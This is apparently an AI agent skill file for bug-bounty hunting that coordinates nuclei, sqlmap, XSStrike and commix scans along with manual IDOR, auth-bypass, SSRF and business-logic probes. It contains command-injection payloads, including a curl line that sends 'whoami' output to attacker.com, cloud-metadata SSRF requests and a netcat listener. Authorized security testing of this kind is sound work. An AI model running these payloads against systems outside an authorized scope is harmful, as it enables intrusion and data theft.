---
name: bug-bounty-hunt
description: >
  Multi-technique vulnerability hunting skill. Coordinates automated and manual
  testing across XSS, SQLi, IDOR, SSRF, RCE, Auth bypass and more.
  Trigger: When user says "hunt", "/hunt", "start hunting", "buscar vulnerabilidades".
license: Apache-2.0
metadata:
  author: gentleman-programming
  version: "1.0"
---

## When to Use

- User says "hunt", "/hunt", "start hunting", "buscar vulnerabilidades"
- After recon is complete and attack surface is mapped
- Running vulnerability scanning across all discovered endpoints
- Multi-vector automated testing coordinated with manual verification
- This is the CORE狩猎 skill that ties RECON → HUNT → VALIDATE together

## Critical Patterns

### /hunt Command Format

```
/hunt [target] [flags]
```

Examples:
```
/hunt acme.com
/hunt api.target.com --full
/hunt 192.168.1.1 --quick
/hunt target.com --xss --sqli --idor
```

### Flags
- `--full` — All attack vectors (default)
- `--quick` — High-priority only (5 min per vector)
- `--xss` — XSS only
- `--sqli` — SQLi only
- `--idor` — IDOR only
- `--ssrf` — SSRF only
- `--auth` — Auth bypass only
- `--rce` — RCE/Command injection only

## Workflow

```
[hunt] orchestrates across vulnerability types
    │
    ├── [1] LOAD TARGET DATA from programs/{target}/recon/
    │
    ├── [2] COORDINATE automated scanners
    │       ├── nuclei (template-based)
    │       ├── sqlmap (SQLi confirmation)
    │       └── XSStrike (XSS scanning)
    │
    ├── [3] MANUAL TESTING VECTORS
    │       ├── IDOR detection
    │       ├── Auth bypass patterns
    │       ├── Business logic flaws
    │       └── SSRF testing
    │
    ├── [4] VALIDATE FINDINGS (calls bug-bounty-validate)
    │       └── Only confirmed vulns move forward
    │
    └── [5] OUTPUT to programs/{target}/vulns/findings.md
```

## Phase 1: Load Target Data

Before hunting, load recon results:

```bash
# Check what recon data exists
ls -la programs/{target}/recon/

# Load and parse:
# - subdomains.txt → target list for scanning
# - endpoints.txt → attack targets
# - tech-stack.txt → technology-specific tests
# - ports.txt → open services
```

If no recon data exists, ABORT and prompt:
```
⚠️ No recon data found. Run /recon first.
Target data required: subdomains.txt, endpoints.txt, ports.txt
```

## Phase 2: Automated Scanner Coordination

### Nuclei Template Scanning

```bash
# Standard template scan
nuclei -l programs/{target}/recon/live-hosts.txt \
  -t /path/to/nuclei-templates \
  -o programs/{target}/vulns/nuclei-results.txt

# Critical severity only
nuclei -l programs/{target}/recon/live-hosts.txt \
  -t cves/ -t critical/ \
  -severity critical \
  -o programs/{target}/vulns/nuclei-critical.txt

# XSS specific templates
nuclei -l programs/{target}/recon/endpoints.txt \
  -t vulnerabilities/xss/ \
  -o programs/{target}/vulns/nuclei-xss.txt
```

### SQLMap Automated Testing

```bash
# Read endpoints from file
sqlmap -m programs/{target}/recon/endpoints.txt \
  --batch --level=2 \
  --smart \
  -o programs/{target}/vulns/sqlmap-results.txt

# With cookies (if available)
sqlmap -m programs/{target}/recon/endpoints.txt \
  --cookie="session=xxx" \
  --batch \
  -o programs/{target}/vulns/sqlmap-results.txt
```

### XSStrike for XSS

```bash
# Scan endpoints list
xsstrike scan --targets programs/{target}/recon/endpoints.txt \
  --output programs/{target}/vulns/xsstrike-results.txt

# Single URL
xsstrike scan --url "https://target.com/search?q=test" \
  --payloads payloads/xss.txt
```

## Phase 3: Manual Testing Vectors

### IDOR Detection Workflow

```bash
# 1. Identify resource endpoints (look for /user/, /order/, /invoice/, /id=)
# 2. Test with two different user contexts
# 3. Compare responses

# Example: Invoice IDOR
curl -b "user_a_session" https://target.com/api/invoices/12345
curl -b "user_a_session" https://target.com/api/invoices/12346

# If both return 200 with data → IDOR CONFIRMED
```

### Auth Bypass Patterns

```bash
# 1. Role manipulation
curl -H "X-Admin: 1" https://target.com/api/admin/users

# 2. JWT manipulation
# Check for alg: "none" vulnerability
# Check for kid path traversal

# 3. Header injection
curl -H "X-Forwarded-For: 127.0.0.1" https://target.com/api/admin

# 4. Null byte injection in parameters
curl "https://target.com/api/user?id=null"
```

### SSRF Testing

```bash
# 1. Identify callback endpoints (url, dest, redirect, src, q params)
# 2. Test local payload
curl "https://target.com/api/fetch?url=http://127.1/"

# 3. Cloud metadata test (if AWS/GCP)
curl "https://target.com/api/fetch?url=http://169.254.169.254/"

# 4. Listen for callback
nc -lvnp 4444
```

### Business Logic Flaws

```bash
# 1. Price manipulation (negative, zero, overflow)
curl -X POST https://target.com/api/checkout \
  -d '{"price": -100}'

# 2. Quantity manipulation
curl -X POST https://target.com/api/cart \
  -d '{"item_id": 1, "qty": -999}'

# 3. Coupon reuse
curl -X POST https://target.com/api/apply-coupon \
  -d '{"code": "SAVE20", "used": false}'

# 4. Race conditions (time-of-check-time-of-use)
# Use ffuf to send concurrent requests
```

### RCE/Command Injection

```bash
# 1. Identify ping/traceroute/dns lookup endpoints
# 2. Test with common injection chars: ; | & `

# Basic test
curl "https://target.com/api/ping?host=localhost;whoami"

# Blind RCE
curl "https://target.com/api/lookup?domain=x.com;curl https://attacker.com/?q=$(whoami)"

# Commix for automated detection
commix --url="https://target.com/api/ping?host=TARGET" --level=3
```

## Phase 4: Validate Findings

Each potential finding MUST be validated before reporting:

```
/validate [vulnerability-type] [target] [endpoint] [evidence]
```

For each finding in findings.md:
1. Confirm vulnerability exists (least invasive test first)
2. Prove exploitability (can you actually execute it?)
3. Quantify impact (what does this give attacker?)
4. Mark as CONFIRMED or FALSE_POSITIVE

## Phase 5: Output Structure

```bash
programs/{target}/vulns/
├── findings.md           # Master findings list
├── poc/                 # Proof of concepts
│   ├── xss-001.md
│   ├── sqli-001.md
│   └── idor-001.md
├── nuclei-results.txt
├── sqlmap-results.txt
├── xsstrike-results.txt
└── confirmed/           # Validated vulnerabilities ready for report
```

## Findings Markdown Format

```markdown
# {Target} — Findings

## Confirmed Vulnerabilities

### [P0] {Vulnerability Type}
- **Location**: {endpoint}
- **Severity**: {Critical/High/Medium/Low}
- **Status**: CONFIRMED
- **Evidence**: {file path or description}
- **Impact**: {what attacker achieves}
- **Validated**: {date}
- **Reported**: {date or N/A}

### [P1] {Vulnerability Type}
- ...

## False Positives (Rejected)

### {Vulnerability Type}
- **Location**: {endpoint}
- **Reason**: {why rejected}
- **Date**: {date}

## TODO
- [ ] {vuln} — validate
- [ ] {vuln} — report
```

## /hunt Quick Reference

```
╔════════════════════════════════════════╗
║           HUNT COMMAND                 ║
╠════════════════════════════════════════╣
║ /hunt [target]                        ║
║ /hunt [target] --full                 ║
║ /hunt [target] --xss --sqli --idor    ║
║ /hunt [target] --quick                ║
╚════════════════════════════════════════╝

Workflow:
  RECON → /recon (done)
    ↓
  HUNT → /hunt (THIS SKILL)
    ↓
  VALIDATE → /validate (calls bug-bounty-validate)
    ↓
  REPORT → /report (calls bug-bounty-report)

Priority Order:
  1. RCE/SQLi (P0 - highest impact)
  2. Auth Bypass / IDOR (P1)
  3. Stored XSS / SSRF (P2)
  4. Reflected XSS / CSRF (P3)
  5. Info Disclosure (P4)
```

## Auto-Resolution

This skill auto-resolves from:
- `/hunt` command in user input
- "start hunting", "buscar bugs", "cazar vulnerabilidades"
- "run vulnerability scan" after /recon completes

## Dependencies

- **Requires**: bug-bounty-recon (target data)
- **Validates with**: bug-bounty-validate
- **Reports with**: bug-bounty-report

## Resources

- **Nuclei Templates**: https://github.com/projectdiscovery/nuclei-templates
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings
- **XSS Payloads**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
- **SQLi Payloads**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
